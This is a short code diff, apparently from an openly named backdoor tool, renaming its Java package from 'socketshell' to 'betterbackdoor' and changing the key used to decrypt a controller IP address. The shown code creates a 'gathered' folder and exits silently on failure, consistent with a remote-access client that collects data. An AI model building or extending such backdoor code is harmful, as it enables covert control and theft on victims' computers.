@@ -1,10 +1,10 @@
-package com.github.thatcherdev.socketshell.backdoor;
+package com.github.thatcherdev.betterbackdoor.backdoor;
 
 import java.io.File;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.Scanner;
-import com.github.thatcherdev.socketshell.backend.Utils;
+import com.github.thatcherdev.betterbackdoor.backend.Utils;
 
 public class Backdoor {
 
@@ -30,7 +30,7 @@ public class Backdoor {
 	 */
 	public static void main(String[] args) {
 		try {
-			ip = Utils.crypt(args[0], "SocketShellIP");
+			ip = Utils.crypt(args[0], "BetterBackdoorIP");
 			new File("gathered").mkdir();
 		} catch (Exception e) {
 			System.exit(0);
